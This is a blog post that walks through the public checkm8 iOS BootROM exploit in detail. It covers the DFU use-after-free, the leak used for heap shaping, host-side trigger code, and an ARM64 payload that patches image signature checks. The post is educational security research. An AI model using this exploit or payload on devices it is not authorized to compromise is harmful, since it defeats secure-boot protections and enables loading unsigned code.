---
layout: post
title: "A comprehensive write-up of the checkm8 BootROM exploit"
date: 2025-10-21 00:00:00 +0000
author: Brian
description: "Deep-dive analysis of the vulnerabilities behind checkm8, including the DFU use-after-free and the memory leak needed for exploitation."
categories: [iOS, Exploitation, Reverse Engineering]
tags: [checkm8, BootROM, DFU, exploit, iOS, ARM64]
permalink: /2025/10/21/checkm8-bootrom-exploit/
---

- [Deep Dive](#deep-dive)
  - [What We're Exploring](#what-were-exploring)
    - [Essential Reading](#essential-reading)
    - [A Quick Note](#a-quick-note)
  - [Setting the Stage: USB Initialization](#setting-the-stage-usb-initialization)
  - [The Dance of USB Transfers](#the-dance-of-usb-transfers)
    - [When Requests Arrive](#when-requests-arrive)
    - [Moving Data Around](#moving-data-around)
  - [The Core Vulnerability: Use-After-Free](#the-core-vulnerability-use-after-free)
    - [Following an Image's Journey](#following-an-images-journey)
    - [What Happens During Shutdown](#what-happens-during-shutdown)
  - [The Missing Piece: Memory Leak](#the-missing-piece-memory-leak)
    - [Understanding the Problem](#understanding-the-problem)
    - [Inside USB Request Structures](#inside-usb-request-structures)
    - [Where Things Go Wrong](#where-things-go-wrong)
  - [Putting It All Together](#putting-it-all-together)
    - [Shaping the Heap](#shaping-the-heap)
    - [Activating the Vulnerability](#activating-the-vulnerability)
    - [Crafting Our Payload](#crafting-our-payload)
      - [Part One: The Overwrite](#part-one-the-overwrite)
    - [Running Our Code](#running-our-code)
      - [Inside the Payload](#inside-the-payload)
  - [Wrapping Up](#wrapping-up)

# Deep Dive

## What We're Exploring

This writeup documents my journey into understanding checkm8—one of the most significant BootROM exploits ever discovered. My goal was simple: deeply understand how this exploit works so I could build my own implementation from scratch.

The checkm8 exploit chains together two distinct vulnerabilities:

- A use-after-free bug (remained unpatched until the A14 chip)
- A memory leak primitive (patched starting with A12)

Here's the crucial detail: you need both vulnerabilities working together to achieve exploitation. The memory leak isn't just helpful—it's absolutely essential for leveraging the use-after-free. This dependency explains why A12 and A13 devices, despite being vulnerable to the use-after-free itself, remain unexploitable by checkm8. Apple patched the memory leak, effectively neutralizing the attack vector.

### Essential Reading

Before diving in, I recommend familiarizing yourself with these resources that guided my research:

- [Technical breakdown of checkm8](https://habr.com/en/companies/dsec/articles/472762/) by [a1exdandy](https://twitter.com/a1exdandy)
- [checkra1n implementation slides](https://papers.put.as/papers/ios/2019/LucaPOC.pdf) by [Luca Todesco](https://twitter.com/qwertyoruiopz)
- [Vulnerability analysis](https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4) by [littlelailo](https://twitter.com/littlelailo)
- [checkm8 Q&A article](https://medium.com/@deepaknx/a-inquisitive-q-a-on-checkm8-bootrom-exploit-82da0d6f6c)
- [ipwndfu toolkit](https://github.com/axi0mX/ipwndfu) by [axi0mX](https://twitter.com/axi0mX)
- [gaster implementation](https://github.com/0x7FF/gaster) by [0x7FF](https://github.com/0x7FF)
- [securerom.fun](https://securerom.fun) for their BootROM dump collection

### A Quick Note

For legal compliance, all code examples throughout this writeup are derived from pseudocode that illustrates control flow. These same functions exist in leaked iBoot/BootROM sources and can be located there as well. I've simplified these examples by removing extraneous code and renaming variables for clarity—this includes various size validations and safety checks that don't impact our understanding. Function names, however, remain unchanged from the original code.

## Setting the Stage: USB Initialization

The USB stack springs to life through `usb_init()`, which subsequently invokes `usb_dfu_init()`. This initialization process accomplishes several critical tasks: it establishes a DFU interface to manage USB communications and allocates a global input/output buffer for data transfers.
```c
int usb_dfu_init()
{   
  // Allocate and zero out the global IO buffer
  // 0x800-byte buffer aligned to 0x40 bytes
  io_buffer = memalign(0x800, 0x40);
  bzero(io_buffer, 0x800);

  // Initialize global state variables
  completionStatus = -1;
  totalReceived = 0;
  dfuDone = false;

  // Set up the USB interface instance
  // ... //

  return 0;
}
```

Key takeaways from this initialization:

- The global IO buffer gets allocated to hold incoming USB data
- `bzero()` fills this entire buffer with zeros, ensuring a clean slate
- State tracking variables are initialized to default values
- A global USB interface instance is configured and ready

## The Dance of USB Transfers

### When Requests Arrive

When DFU receives a USB control transfer, the system calls `usb_core_handle_usb_control_receive()`. This function locates the appropriate DFU interface handler and delegates to `handle_interface_request()`. Let's examine what happens when the host sends data to the device:

For download operations (which are critical for understanding this vulnerability), the function returns one of three possible values:

- **0** — transfer completed successfully
- **-1** — requested wLength exceeds IO buffer capacity
- **wLength value** — device is prepared to receive exactly wLength bytes
```c
int handle_interface_request(struct usb_device_request *request, uint8_t **out_buffer)
{
  int ret = -1;

  // Check if this is host-to-device transfer
  if ((request->bmRequestType & 0x80) == 0)
  {
    switch(request->bRequest)
    {
      case 1: // DFU_DNLOAD
      {
        if(wLength > sizeof(*io_buffer)) {
          return -1;
        }

        *out_buffer = (uint8_t *)io_buffer; // Point to IO buffer
        expecting = wLength;
        ret = wLength;
        break;
      }

      case 4: // DFU_CLR_STATUS
      case 6: // DFU_ABORT
      {
        totalReceived = 0;

        if(!dfuDone) {
          // Update globals to abort DFU
          completionStatus = -1;
          dfuDone = true;
        }

        ret = 0;
        break;
      }
    }
    return ret;
  }
  return -1;
}
```

Pay close attention to these important details:

- The `out_buffer` parameter gets updated to reference the global IO buffer
- The function returns wLength (after validation) to indicate expected data length

Back in `usb_core_handle_usb_control_receive()`, this return value determines how to proceed:
```c
int ret = registeredInterfaces[interfaceNumber]->handleRequest(&setupRequest, &ep0DataPhaseBuffer);

// Host-to-device transfer
if((setupRequest.bmRequestType & 0x80) == 0) {

  // Handler returned wLength, prepare for data
  if (ret > 0) {
    ep0DataPhaseLength = ret;
    ep0DataPhaseInterfaceNumber = interfaceNumber;
    // Begin data phase
  }

  // Handler returned 0, transfer complete
  else if (ret == 0) {
    usb_core_send_zlp();
    // Begin data phase
  }
}

// Device-to-host transfer
else if((setupRequest.bmRequestType & 0x80) == 0x80) {
    // Begin data phase
}
```

When `handle_interface_request()` returns a positive value, the system updates the global variable tracking expected data length. Notice that `ep0DataPhaseBuffer` now points to the global IO buffer, ready for the data phase.

### Moving Data Around

After the setup phase completes, the data phase begins. Here's the critical part of `handle_ep0_data_phase()` that manages incoming data:
```c
void handle_ep0_data_phase(u_int8_t *rxBuffer, u_int32_t dataReceived, bool *dataPhase)
{
  // Copy received data to data phase buffer
  // ...

  // Check if we've received everything
  if(ep0DataPhaseReceived == ep0DataPhaseLength)
  { 
    // Invoke interface callback and send zero-length packet
    // to signal completion

    goto done; // Clean up global state
  }
  return;
}
```

Once all data arrives, the IO buffer contents get copied to an image buffer for eventual loading. Then this cleanup code executes:
```c
done:
  ep0DataPhaseReceived = 0;
  ep0DataPhaseLength = 0; 
  ep0DataPhaseBuffer = NULL;
  ep0DataPhaseInterfaceNumber = -2;
```

Let me summarize this entire process:

- During DFU initialization, the IO buffer is allocated and zeroed
- For data transfers, the global buffer pointer is set to the IO buffer
- USB data flows directly into the IO buffer
- After image transfer completes, IO buffer contents move to an image buffer
- Global state gets reset, preparing for the next image transfer

## The Core Vulnerability: Use-After-Free

### Following an Image's Journey

When DFU mode activates, the main entry point is `getDFUImage()`. Here are its essential operations:
```c
int getDFUImage(void* buffer, int maxLength)
{
  // Store parameters in globals
  imageBuffer = buffer;
  imageBufferSize = maxLength;

  // Wait for DFU completion
  while (!dfuDone) {
    event_wait(&dfuEvent);
  }

  // Shut down USB operations
  usb_quiesce();

   // return ... //
}
```

The function essentially waits for DFU operations to finish, then shuts down the USB stack. Looking back at `handle_ep0_data_phase()`, we see global variables get reset after the data phase completes. But what happens if the data transfer never completes? The function simply returns **without clearing global state**. This is excellent for an attacker—the global variable pointing to the IO buffer remains intact.

### What Happens During Shutdown

Examining `handle_interface_request()` again reveals that sending a `DFU_ABORT` command sets `dfuDone` to `true`, signaling DFU termination. A USB reset triggers the same effect through `handle_bus_reset()`. In `getDFUImage()`, this triggers `usb_quiesce()` to tear down the USB stack:
```c
void usb_quiesce()
{
  usb_core_stop();
  usb_free();
  usb_inited = false;
}
```

The `usb_free()` function calls `usb_dfu_exit()`, which contains this critical code:
```c
if (io_buffer) {
  free(io_buffer);
  io_buffer = NULL;
}
```

Following the execution chain, we discover:

- Incomplete data phase → global variables stay intact
- `DFU_ABORT` command → sets `dfuDone` to true
- This triggers `usb_quiesce()` → frees the IO buffer
- `getDFUImage()` returns and gets called again on DFU re-entry
- Global variables aren't re-initialized on re-entry
- The global variable pointing to the IO buffer persists, but now points to freed memory

This is our use-after-free vulnerability—the exact primitive exploited by checkm8. Next, I'll explain how to weaponize this bug to achieve code execution. But first, we need a memory leak.

If you're paying close attention, you might realize that sending another `DFU_DNLOAD` request after triggering the use-after-free would simply reset the global variables. We work around this by avoiding any requests that would satisfy those conditions between triggering the vulnerability and sending our overwrite. Once our overwrite occupies the freed buffer's beginning, we can send the payload (via `DFU_DNLOAD`) to the new IO buffer, and the overwrite will redirect execution to our payload. I'll explain this in detail later.

## The Missing Piece: Memory Leak

### Understanding the Problem

The SecureROM exhibits highly deterministic behavior—the IO buffer typically gets allocated at roughly the same heap location each time the USB stack initializes. However, exploiting the use-after-free requires DFU re-entry and calling `getDFUImage()` again, creating a problem: the newly-allocated IO buffer would normally just overwrite the freed buffer, rendering our vulnerability useless. 

Enter the memory leak—our technique for tricking the heap allocator into placing the new IO buffer elsewhere on the heap. This leak's absence on A12 and A13 explains why checkm8 fails on those devices. They're vulnerable to the use-after-free and it can be triggered, but there's no way to prevent the IO buffer from being reallocated over the freed one.

For context: a memory leak occurs when allocated memory fails to be properly deallocated or freed, leaving memory allocated but inaccessible.

### Inside USB Request Structures

Here's the `usb_device_io_request` structure (I'll call it `io_request` for brevity):
```c
struct usb_device_io_request
{
    u_int32_t                       endpoint;
    volatile u_int8_t               *io_buffer;
    int                             status;
    u_int32_t                       io_length;
    u_int32_t                       return_count;
    void (*callback) (struct usb_device_io_request *io_request);
    struct usb_device_io_request    *next;
};
```

Two fields matter for understanding the memory leak: `callback` points to a function called when the request completes, and `next` points to the next `io_request` in the linked list.

### Where Things Go Wrong

Stalling the device-to-host pipe prevents it from processing requests while stalled. During this stalled period, you can trigger numerous allocations by sending many requests. Each request gets its `io_request` structure allocated and added to the endpoint's linked list. When you unstall the pipe, all these requests get freed and deallocated. This gives us the ability to allocate objects and delay their deallocation on the heap.

But these allocations won't persist through USB stack shutdown. For that, we need a memory leak where certain requests never get properly deallocated.

The leak exists in the standard callback for `io_request` objects. The device attempts to send a zero-length packet if, and only if, three conditions are met: the request length exceeds zero **and** is an exact multiple of packet size (`0x40`) **and** the host requested more bytes than this length.
```c
void standard_device_request_cb (struct usb_device_io_request *request)
{
  if ((request->io_length > 0)
  && ((request->io_length % 0x40) == 0)
  && (setup_request.wLength > request->io_length)) { 
    usb_core_send_zlp();
  }
}
```

When a USB reset or DFU abort triggers USB stack shutdown, the device first aborts and disables all endpoints, then performs `bzero()` on the entire endpoint structure array. During shutdown, all pending requests are processed as failed, triggering their callbacks. The problem: these additional zero-length packets never get sent during shutdown, so they leak.

Stalling the pipe and sending numerous requests creates a buildup of allocations. Triggering a USB reset invokes these request callbacks, which queue additional zero-length packets that leak.

On A12+ devices, when a USB reset occurs, the subsequent abort also aborts EP0_IN for each setup packet—resulting in `abort()` being called twice. The first abort queues an additional zero-length packet, but the second successfully reaps and deallocates it. Only after this does `bzero()` execute.

There's a second bug contributing to the leak. Inside `standard_device_request_cb()`, the current setup packet's `wLength` is checked against the request's `io_length`. However, the function fails to account for the setup packet potentially being overwritten by a new one before the check happens. During heap spray, we cause numerous allocations, but send a final request with the highest `wLength` of all, so the callback checks this request's `wLength` during each callback when the USB stack shuts down.

When the host receives a packet smaller than `0x40` bytes (since transfers split into `0x40`-byte chunks), the transfer completes. So for transfer lengths that are exact multiples of `0x40`, a zero-length packet must signal transfer completion.

The callbacks invoked during USB stack shutdown could queue zero-length packet requests that then leak—these are perfect for heap shaping. Due to heap allocator logic, if the IO buffer is `0x800` bytes and two allocations are leaked exactly `0x800` bytes apart, the space between them becomes preferred for the next `0x800`-byte allocation (the IO buffer upon DFU re-entry). The heap allocator chooses the smallest possible space for allocation, and the space between leaked allocations will be the perfect size.

## Putting It All Together

To trigger the use-after-free with an incomplete data phase, you must exceed normal USB transfer boundaries defined in the USB specification. The open-source community has utilized two approaches: first, using microcontrollers (Arduino + USB Host Controller) for maximum control over the host USB stack, enabling precise control of packets sent and timing; second, forcing transfer cancellation midway through, as done in ipwndfu and gaster (among others) using extremely short timeouts on asynchronous transfers.

Exploitation proceeds in three stages:

1. Heap shaping (heap feng shui)
2. Triggering the use-after-free vulnerability
3. Sending and executing the payload

The following sections contain code examples from my Achilles project, heavily based on gaster's implementation. Note that this is simplified for the T8011 SoC—certain exploit aspects vary across different SoCs.

### Shaping the Heap

Heap feng shui deliberately manipulates the heap layout to benefit exploitation. Using the memory leak discussed earlier, we can trick the heap allocator into placing the IO buffer at a different location on re-entry—allowing us to access the freed buffer from the previous DFU iteration.

To craft the hole for the next IO buffer, we should:

1. Stall the device-to-host endpoint
2. Send numerous requests to create a buildup of allocations
3. Have the first and last requests meet requirements for sending an additional zero-length packet
4. Trigger a USB reset so `usb_quiesce()` is called and these requests leak
5. Leave ourselves with a hole controlling next IO buffer allocation

Since all heap allocations round up to the nearest `0x40` multiple, and each packet has a `0x40`-byte header, we can safely assume each `io_request` object occupies `0x80` bytes on the heap. One strategy would be sending `0x10` non-leaking packets to create an `0x800`-byte hole—exactly the IO buffer size. Testing proved this successful, but it's not the chosen solution.

A faster, simpler strategy (used in most implementations) sends the bare minimum packets such that a hole is created smaller than `0x800`, but large enough that allocations shuffle around sufficiently for the IO buffer to be allocated elsewhere upon re-entry. This is the strategy in the function below, adapted for T8011 BootROM:
```c
bool checkm8HeapSpray(device_t *device)
{
    checkm8Stall(device)
    for (int i = 1; i <= config.hole; i++)
    {
        checkm8NoLeak(device)
    }
    checkm8USBRequestLeak(device)
    checkm8NoLeak(device)
    return true;
}
```

Walking through step-by-step:

**`checkm8Stall(device)`**

This stalls the device-to-host endpoint, allowing numerous `io_request` structures to be allocated as requests pile up unprocessed during the stalled state. Additionally, this request leaks a zero-length packet, matching the callback function's requirements for sending an additional zero-length packet.
```c
for (int i = 1; i <= config.hole; i++)
{
    checkm8NoLeak(device)
}
```

This sends `config.hole` requests to the device, each getting an `io_request` structure allocated. These requests won't leak zero-length packets since they don't meet the callback function's requirements. This creates a 'hole' that will be properly deallocated when the USB stack quiesces.

**`checkm8USBRequestLeak(device)`**

This leaks an additional zero-length packet, giving us our needed hole. Since we sent a zero-length packet at the function's start, current allocations look like this:
```
[  Leaked packet  ]
[  Normal packet  ]
[  Normal packet  ]
[  Normal packet  ]
[  Normal packet  ]
[  Normal packet  ]
[  Normal packet  ]
[  Leaked packet  ]
```

After USB stack reset, it becomes:
```
[ Allocated space ]
[   Empty space   ]
[   Empty space   ]
[   Empty space   ]
[   Empty space   ]
[   Empty space   ]
[   Empty space   ]
[ Allocated space ]
```

The heap allocator then allocates objects inside this hole sufficiently to shuffle other allocations, resulting in the IO buffer being allocated elsewhere on re-entry.

**`checkm8NoLeak(device)`**

This sends a request that doesn't leak a zero-length packet, getting deallocated when the USB stack quiesces. The `checkm8NoLeak()` transfer has a `wLength` of `0xC1`—the highest of all heap feng shui transfers. This ensures the host requests more bytes in the setup packet, meeting conditions for additional zero-length packets to be sent and leaked.

At this point, the heap is shaped such that the next IO buffer allocates at a different location than the standard address, which is occupied by the freed buffer. If the new IO buffer allocated in the same place, we couldn't exploit the use-after-free since the freed buffer would be overwritten.

### Activating the Vulnerability

With the new IO buffer hopefully allocated elsewhere on the heap (thanks to our heap feng shui), we can now trigger the main use-after-free vulnerability.

1. Send a setup packet with request type where `bmRequestType & 0x80 == 0` (we'll use `0x21`), a `DFU_DNLOAD` request, and a `wLength` less than or equal to `0x800`. This sets all global variables to necessary values.
2. Begin the data phase but leave it incomplete to evade global state clearing.
3. Send a `DFU_ABORT` request to free the IO buffer and trigger DFU re-entry. This activates the use-after-free.

Here's my function triggering the use-after-free:
```c
bool checkm8TriggerUaF(device_t *device)
{
  unsigned usbAbortTimeout = 10;
  transfer_ret_t transferRet;

  while(sendUSBControlRequestAsyncNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, 0x800, usbAbortTimeout, &transferRet)) {
    if(transferRet.sz < config.overwritePadding 
    && sendUSBControlRequestNoData(&device->handle, 0, 0, 0, 0, config.overwritePadding - transferRet.sz, &transferRet) 
    && transferRet.ret == USB_TRANSFER_STALL) {
      sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
      return true;
    }
    if(!sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL)) {
      break;
    }
    usbAbortTimeout = (usbAbortTimeout + 1) % 10;
  }
  return false;
}
```

First, let's examine the while loop:
```c
while(sendUSBControlRequestAsyncNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, 0x800, usbAbortTimeout, &transferRet)) {
  // ... //
  usbAbortTimeout = (usbAbortTimeout + 1) % 10;
}
```

We're sending the required packet to set global variables, continuing to send it asynchronously with progressively shorter timeouts until it's cancelled midway through. This achieves the partially complete data phase state on the device.

Interestingly, we never actually send data to trigger this use-after-free. Sending the `0x21, DFU_DNLOAD` request sets global variables and sets the global data phase variable to true.
```c
if(transferRet.sz < config.overwritePadding 
    && sendUSBControlRequestNoData(&device->handle, 0, 0, 0, 0, config.overwritePadding - transferRet.sz, &transferRet) 
    && transferRet.ret == USB_TRANSFER_STALL) {
    sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
    return true;
}
```

After sending the asynchronous request, we check if the device returned a size less than the overwrite padding. The overwrite padding ensures our later overwrite goes to the correct memory location—I won't delve too deeply into this.

We then check if the device is stalled, indicating conditions are right for triggering the use-after-free. If so, send a `DFU_CLRSTATUS` to shut down the USB stack and trigger the vulnerability.

After this, the first iteration's IO buffer is freed while global variables retain their values—including the variable pointing to the old IO buffer. The new IO buffer should be allocated in the hole created during heap feng shui. Hence, sending data to the device writes it to the address in the global variable pointing to the old IO buffer.

Next, we need to send our overwrite and payload to gain full arbitrary code execution.

### Crafting Our Payload

The complete payload is the data we send to achieve full device execution as part of exploitation. It comes in two parts:

1. **The overwrite**
2. **The actual payload**

The overwrite is data sent to overwrite the `callback` and `next` fields of an `io_request` structure. This redirects execution flow to the main payload.

The main payload is machine code performing actions like modifying the USB serial number and patching signature checks to allow unsigned images to boot. I'm using the gaster payload found in that project and my own.

#### Part One: The Overwrite

For the overwrite, the `callback` and `next` fields in the `io_request` structure at the freed buffer's beginning need overwriting. Both are pointers to memory areas—`callback` pointing to the callback function and `next` pointing to the next `io_request` in the pending requests linked list.

When exploiting checkm8, overwriting the callback function provides an opportunity to restore the link and FP registers, preventing the current USB request from being freed. Since we've overwritten heap data, attempting to free the object would result in invalid heap metadata, causing issues and possibly device crashes.

For those unfamiliar: the link register (LR) holds the address to jump back to after returning from a function. The frame pointer (FP) holds the current stack frame's address, which looks like this:
```
+-----------------+
|  Return Address |
+-----------------+
|  Arguments      |
|  and Parameters |
+-----------------+
| Local Variables |
+-----------------+
| Saved Registers |
+-----------------+
|  Frame Pointer  |
+-----------------+
```

The stack frame is the stack area currently used by the program, typically changing when functions are called or return. It holds local variables, return address, and other important program data.

But why restore these registers? Recall that when the USB stack shuts down, it processes pending requests and `usb_core_complete_endpoint_io()` invokes each callback function. However, after doing so, this function frees the IO request object. By restoring the link and FP registers, we can have execution jump back to the function that called `usb_core_complete_endpoint_io()`, instead of continuing to free the IO request object.

Since `callback` is a pointer to a memory area, we can't simply overwrite the field with machine code to do this job. This brings us to the **nop gadget** used in popular checkm8 implementations—though the name isn't particularly accurate. *nop* means "no operation," typically code doing nothing. However, in checkm8's case, the nop gadget in BootROM code looks like this:
```
ldp x29, x30, [sp, #0x10]
ldp x20, x19, [sp], #0x20
ret
```

For context, the `x29` register is the frame pointer, and `x30` is the link register. It's important to know that for ARM64, the stack usually grows downward from high to low addresses, and the stack pointer (SP) holds the lowest address occupied by the stack.

Here's a breakdown of `ldp x29, x30, [sp, #0x10]`:

- `ldp` is the load pair instruction, loading a pair of registers from memory into the specified address
- `x29, x30` is the register pair to load from
- `[sp, #0x10]` is the address to load registers from. `sp` is the stack pointer, and `#0x10` is the offset. Since the stack grows downward, adding `0x10` to the stack pointer points to memory just above the stack pointer, where the link and FP registers are stored. `0x10` is the combined size of the register pair—16 bytes, since each register is 64 bits or 8 bytes.

`ldp x20, x19, [sp], #0x20` does a similar job, except it loads registers from the stack pointer without offset, then increments the stack pointer by `0x20` (32 bytes)—done for alignment purposes and ensuring the stack pointer points to the correct address for the next instruction accessing that memory.

Finally, `ret` is the return instruction, returning to the address stored in the link register.

### Running Our Code

With the payload in place and an `io_request` having its `next` field pointing to an address inside our payload, we can trigger a USB reset. As always, this processes the list of pending requests (which we just allocated while stalled) as failed and invokes the callback for each.

When it reaches our overflown `io_request` object, it executes the callback (just a nop gadget to restore link and FP registers) then follows the `next` field to arrive in our payload's middle. It then tries to execute the `callback` field of what it believes is an `io_request` object, but actually begins executing our callback chain at the address we overflowed the `next` field with + the offset of the `callback` field in the `io_request` structure (`0x20`).

Now I'll walk through the payload explaining exactly what it does at each step.

#### Inside the Payload

While ARM64 assembly may seem daunting, it makes sense once you understand each instruction. Here's the `_main` function from the main checkm8 payload for T8011, containing another label as part of it:
```asm
_main:
  stp x29, x30, [sp, #-0x10]!
  ldr x0, =payload_dest
  ldr x2, =dfu_handle_bus_reset
  str xzr, [x2]
  ldr x2, =dfu_handle_request
  add x1, x0, #0xC
  str x1, [x2]
  adr x1, _main
  ldr x2, =payload_off
  add x1, x1, x2
  ldr x2, =payload_sz
  ldr x3, =memcpy_addr
  blr x3
  ldr x0, =gUSBSerialNumber
_find_zero_loop:
  add x0, x0, #1
  ldrb w1, [x0]
  cbnz w1, _find_zero_loop
  adr x1, PWND_STR
  ldp x2, x3, [x1]
  stp x2, x3, [x0]
  ldr x0, =gUSBSerialNumber
  ldr x1, =usb_create_string_descriptor
  blr x1
  ldr x1, =usb_serial_number_string_descriptor
  strb w0, [x1]
  mov w0, #0xD2800000
  ldr x1, =patch_addr
  str w0, [x1]
  ldp x29, x30, [sp], #0x10
  ret

PWND_STR:
.asciz " PWND:[checkm8]"
```

The first line stores the new link register and frame pointer, as any program would when branching to a new function. After this line, the proper payload begins.
```
ldr x0, =payload_dest
ldr x2, =dfu_handle_bus_reset
str xzr, [x2]
```

This loads the payload destination address into `x0`, and the `dfu_handle_bus_reset` address into `x2`. `dfu_handle_bus_reset` is the `handle_bus_reset` property of the USB interface instance created when DFU starts—simply a pointer to the `handle_bus_reset()` function. The value in the `xzr` register (the zero register) is stored to memory at the `dfu_handle_bus_reset` address to ensure the device doesn't respond to USB reset and trigger USB stack shutdown again—this would cause issues due to heap state and how we're using allocated `io_request` structures for exploitation.
```
ldr x2, =dfu_handle_request
add x1, x0, #0xC
str x1, [x2]
```

This loads the `dfu_handle_request` address (the `handle_request` field of the interface instance) into `x2`, then adds `0xC` to the value in `x0` (the payload destination) and stores the result in `x1`. It then stores the value in `x1` to the address in `x2`, which is `dfu_handle_request`. This means when `interface->handle_request()` is called, it jumps to shellcode inside `payload_handle_checkm8_request.S`, which is gaster-specific and doesn't need detailed coverage here. **TL;DR**: it replaces the DFU interface's `handle_request()` function with a custom one doing something different when a specific USB request is sent (`0xA1, 2`). Gaster uses this in the `gaster_command()` function for encryption/decryption operations. If this specific request isn't used, the replacement shellcode just calls the standard `handle_interface_request()` function.
```
adr x1, _main
ldr x2, =payload_off
add x1, x1, x2
ldr x2, =payload_sz
ldr x3, =memcpy_addr
blr x3
```

This loads the PC-relative address of `_main` into `x1`, and the payload end address into `x2`. By adding them together and storing the result in `x1`, we calculate the address that is `payload_off`-bytes from `_main`'s address. The `payload_sz` variable is loaded into `x2` and the `memcpy()` function address into `x3`. Finally, `blr x3` branches to the address in `x3` with the link register linking back to the `_main` function, executing `memcpy()`.

The `memcpy()` parameters are: `memcpy(void *dst, void *src, size_t n)`. So the payload destination address is stored in `x0`, the payload address in `x1`, and payload size in `x2`. Hence, the `memcpy()` call copies the payload to the payload destination.
```
ldr x0, =gUSBSerialNumber
```

After returning from `memcpy()`, the `gUSBSerialNumber` (global USB serial number) address is loaded into `x0` as the payload destination is no longer needed.
```asm
_find_zero_loop:
  add x0, x0, #1
  ldrb w1, [x0]
  cbnz w1, _find_zero_loop
```

This loop increments the address in `x0` (`gUSBSerialNumber`) by 1 and loads the byte at that address into `w1`. If the byte isn't zero, it branches back to `_find_zero_loop` and continues. This continues until the byte at the address in `x0` is zero, then continues to the next instruction. It finds the serial number string's end in memory to append `PWND:[checkm8]` to it.
```
adr x1, PWND_STR
ldp x2, x3, [x1]
stp x2, x3, [x0]
```

`PWND_STR` is loaded into `x1`, then the register pair `x2` and `x3` are loaded from the address in `x1`. These are stored to the address in `x0`—the serial number string's end. This appends `PWND:[checkm8]` to the serial number string.
```
ldr x0, =gUSBSerialNumber
ldr x1, =usb_create_string_descriptor
blr x1
```

The `gUSBSerialNumber` start address is loaded into `x0` again, and the `usb_create_string_descriptor()` function address into `x1`. By branching with a link to register `x1`, the device creates a new string descriptor using the serial number so it appears to the host computer with the custom serial number string.
```
ldr x1, =usb_serial_number_string_descriptor
strb w0, [x1]
```

The `usb_serial_number_string_descriptor` is updated with the new serial number string to reflect the payload's changes.
```
mov w0, #0xD2800000
ldr x1, =patch_addr
str w0, [x1]
```

A value of `0xD2800000` is loaded into `w0`, decodable to the instruction `mov x0, 0`. The value in `patch_addr` is loaded into `x1`, and `0xD2800000` is written to memory at the address pointed to by `patch_addr`. The reason: `patch_addr` points to an instruction inside `image4_validate_property_callback()`, replacing it—so if an image is found improperly signed, instead of branching to a function rejecting it, `mov x0, 0` sets the return value to 0, so the device thinks it's a validly-signed image. This is the signature check patch allowing untrusted image booting.

And that's it—the payload has executed, signature checks are patched, the serial number is updated, and the exploit is finally complete.

## Wrapping Up

This concludes my writeup on the checkm8 exploit. This journey has been immensely valuable, teaching me not just about the BootROM, but exploitation in general. Before researching checkm8, I had no appreciation for how critical memory leaks can be in exploitation chains.

I hope this writeup has provided you with thorough insight into the checkm8 exploit and proven as helpful to you as it was educational for me.

I'll continue updating and posting to my site as my courses allow.
